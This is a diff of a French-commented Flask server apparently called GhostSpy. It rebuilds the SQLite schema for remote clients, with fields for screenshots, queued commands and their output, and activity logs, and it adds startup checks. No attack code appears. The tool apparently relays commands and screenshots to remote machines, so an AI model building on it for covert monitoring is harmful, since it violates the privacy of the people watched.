@@ -6,7 +6,7 @@ import json
 import time
 import secrets
 import threading
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, Response, request, jsonify, send_from_directory
 from functools import wraps
 import customtkinter as ctk
 from datetime import datetime
@@ -16,16 +16,11 @@ import io
 from PIL import Image
 import threading
 
-
-def install_requirements(req_file="requirements.txt"):
-    subprocess.run(["pip", "install", "-r", req_file])
-
-install_requirements()
-
 app = Flask(__name__)
 
 CONFIG_FILE = 'config.json'
 DATABASE = 'clients.db'
+SCHEMA_FILE = 'schema.sql'
 SCREENSHOT_FOLDER = 'screenshots'
 UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), SCREENSHOT_FOLDER)
 TIMEOUT_SECONDES = 60  # Définir le délai après lequel un client est considéré comme déconnecté (ici 60 secondes)
@@ -136,12 +131,126 @@ def get_db_connection():
     return conn
 
 def init_db():
-    conn = get_db_connection()
-    with app.open_resource('schema.sql', mode='r') as f: # On va créer un fichier schema.sql à l'étape suivante
-        conn.cursor().executescript(f.read())
-    conn.commit()
-    conn.close()
-    print("Base de données initialisée.")
+    """
+    Initialise la base de données avec les tables nécessaires
+    en utilisant des commandes SQL directes pour éviter les problèmes de fichier.
+    """
+    global DATABASE  # Déplacer cette ligne au début de la fonction
+    
+    print("\n=== INITIALISATION DE LA BASE DE DONNÉES GHOSTSPY ===\n")
+    
+    # Utiliser un fichier temporaire pour éviter les problèmes de verrouillage
+    temp_db = DATABASE + ".new"
+    
+    try:
+        # Supprimer le fichier temporaire s'il existe déjà
+        if os.path.exists(temp_db):
+            os.remove(temp_db)
+            
+        # Créer une nouvelle base de données temporaire
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        print(f"Création de la base de données temporaire {temp_db}...")
+        
+        # Schéma SQL - Table des clients
+        cursor.execute("""
+        DROP TABLE IF EXISTS clients;
+        """)
+        
+        cursor.execute("""
+        CREATE TABLE clients (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            name TEXT NOT NULL,
+            os_type TEXT NOT NULL,
+            last_checkin INTEGER,
+            is_connected BOOLEAN DEFAULT 0,
+            last_screenshot_path TEXT,
+            command_to_execute TEXT,
+            command_output TEXT,
+            add_api_key TEXT,
+            resources TEXT,
+            pdf_report_path TEXT,
+            activity_logs TEXT,
+            
+            -- Paramètres des fonctionnalités
+            settings_virustotal_enabled INTEGER DEFAULT 0,
+            settings_activity_logs_enabled INTEGER DEFAULT 0,
+            settings_file_detection_enabled INTEGER DEFAULT 0,
+            settings_system_resources_enabled INTEGER DEFAULT 0
+        );
+        """)
+        
+        print("Table 'clients' créée avec succès.")
+        
+        # Schéma SQL - Table de l'historique des commandes
+        cursor.execute("""
+        DROP TABLE IF EXISTS command_history;
+        """)
+        
+        cursor.execute("""
+        CREATE TABLE command_history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            client_id INTEGER NOT NULL,
+            command TEXT NOT NULL,
+            command_id TEXT,
+            button_type TEXT DEFAULT 'Manual',
+            status TEXT DEFAULT 'pending',
+            stdout TEXT,
+            stderr TEXT,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY (client_id) REFERENCES clients (id)
+        );
+        """)
+        
+        print("Table 'command_history' créée avec succès.")
+        
+        # Validation du schéma
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+        tables = cursor.fetchall()
+        print(f"Tables créées: {[table[0] for table in tables]}")
+        
+        # Valider la structure de la table clients
+        cursor.execute("PRAGMA table_info(clients);")
+        clients_columns = cursor.fetchall()
+        print(f"Colonnes de la table 'clients': {len(clients_columns)} colonnes")
+        
+        # Valider la structure de la table command_history
+        cursor.execute("PRAGMA table_info(command_history);")
+        history_columns = cursor.fetchall()
+        print(f"Colonnes de la table 'command_history': {len(history_columns)} colonnes")
+        
+        # Sauvegarder les modifications
+        conn.commit()
+        conn.close()
+        print(f"Base de données temporaire créée avec succès!")
+        
+        # Remplacer la base de données existante par la nouvelle
+        try:
+            # Sur Windows, on ne peut pas remplacer un fichier ouvert
+            # On renomme d'abord l'ancien fichier s'il existe
+            if os.path.exists(DATABASE):
+                backup_db = DATABASE + ".bak"
+                # Supprimer l'ancienne sauvegarde si elle existe
+                if os.path.exists(backup_db):
+                    os.remove(backup_db)
+                # Renommer l'actuelle en backup
+                os.rename(DATABASE, backup_db)
+                print(f"Ancienne base de données renommée en {backup_db}")
+            
+            # Renommer la nouvelle base de données
+            os.rename(temp_db, DATABASE)
+            print(f"Nouvelle base de données installée avec succès!")
+            
+        except Exception as rename_err:
+            print(f"Erreur lors du remplacement de la base de données: {rename_err}")
+            print("Utilisation de la base de données temporaire à la place.")
+            DATABASE = temp_db  # Modification de la variable globale
+        
+    except sqlite3.Error as e:
+        print(f"Erreur SQLite lors de la création de la base de données: {e}")
+    except Exception as e:
+        print(f"Erreur inattendue lors de la création de la base de données: {e}")
 
 @app.cli.command('initdb') # Pour initialiser la base de données avec la commande flask initdb
 def initdb_command():
@@ -790,35 +899,38 @@ def execute_pdf_command(client_id):
 def ensure_activity_logs_column():
     try:
         conn = get_db_connection()
-        # Vérifier si la colonne existe déjà
         cursor = conn.cursor()
         columns = [column[1] for column in cursor.execute('PRAGMA table_info(clients)').fetchall()]
         
         if 'activity_logs' not in columns:
-            # Ajouter la colonne activity_logs si elle n'existe pas
             conn.execute('ALTER TABLE clients ADD COLUMN activity_logs TEXT')
             conn.commit()
             print("Colonne activity_logs ajoutée à la table clients")
+        else:
+            print("Colonne activity_logs existe déjà.")
         conn.close()
+    except sqlite3.OperationalError as e:
+        print(f"Erreur SQLite lors de la vérification/ajout de la colonne activity_logs: {e}")
     except Exception as e:
-        print(f"Erreur lors de la vérification ou de l'ajout de la colonne activity_logs: {e}")
+        print(f"Erreur inattendue lors de la vérification/ajout de la colonne activity_logs: {e}")
 
-# Fonction pour s'assurer que la colonne pdf_report_path existe dans la base de données
 def ensure_pdf_report_path_column():
     try:
         conn = get_db_connection()
-        # Vérifier si la colonne existe déjà
         cursor = conn.cursor()
         columns = [column[1] for column in cursor.execute('PRAGMA table_info(clients)').fetchall()]
         
         if 'pdf_report_path' not in columns:
-            # Ajouter la colonne pdf_report_path si elle n'existe pas
             conn.execute('ALTER TABLE clients ADD COLUMN pdf_report_path TEXT')
             conn.commit()
             print("Colonne pdf_report_path ajoutée à la table clients")
+        else:
+            print("Colonne pdf_report_path existe déjà.")
         conn.close()
+    except sqlite3.OperationalError as e:
+        print(f"Erreur SQLite lors de la vérification/ajout de la colonne pdf_report_path: {e}")
     except Exception as e:
-        print(f"Erreur lors de la vérification ou de l'ajout de la colonne pdf_report_path: {e}")
+        print(f"Erreur inattendue lors de la vérification/ajout de la colonne pdf_report_path: {e}")
 
 # Appel au démarrage du serveur
 ensure_activity_logs_column()
@@ -1069,11 +1181,46 @@ def check_pdf_exists(client_id):
         app.logger.error(f"Erreur lors de la vérification de l'existence du PDF: {str(e)}")
         return jsonify({'exists': False, 'error': str(e)}), 500
 
+# Ajouter cette route pour gérer les requêtes favicon.ico
+@app.route('/favicon.ico')
+def favicon():
+    return send_from_directory(app.static_folder, 'SpyGhost_icon.ico', mimetype='image/x-icon')
+
 if __name__ == '__main__':
-    # Initialiser la base de données si elle n'existe pas
-    if not os.path.exists(DATABASE):
+    # Toujours vérifier si le fichier de base de données existe et est valide
+    db_exists = os.path.exists(DATABASE)
+    
+    if not db_exists:
+        print("Base de données non trouvée, création en cours...")
         init_db()
         print('Base de données initialisée au démarrage.')
-        
-    demarrer_verificateur_deconnexions() # Démarrer le vérificateur de déconnexions au lancement du serveur
+    else:
+        # Vérifier si la table clients existe
+        try:
+            conn = sqlite3.connect(DATABASE)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='clients';")
+            if not cursor.fetchone():
+                print("Structure de la base de données incorrecte, réinitialisation...")
+                conn.close()
+                init_db()
+            else:
+                print("Base de données existante et valide.")
+            conn.close()
+        except Exception as e:
+            print(f"Erreur lors de la vérification de la base de données: {e}")
+            print("Réinitialisation de la base de données...")
+            init_db()
+    
+    # S'assurer que les colonnes existent seulement après l'initialisation
+    try:
+        ensure_activity_logs_column()
+        ensure_pdf_report_path_column()
+    except Exception as e:
+        print(f"Erreur lors de la vérification des colonnes: {e}")
+    
+    # Démarrer le vérificateur de déconnexions seulement après l'initialisation de la base de données
+    demarrer_verificateur_deconnexions()
+    
+    # Lancement du serveur
     app.run(host='0.0.0.0')  # Écoute sur toutes les interfaces réseau
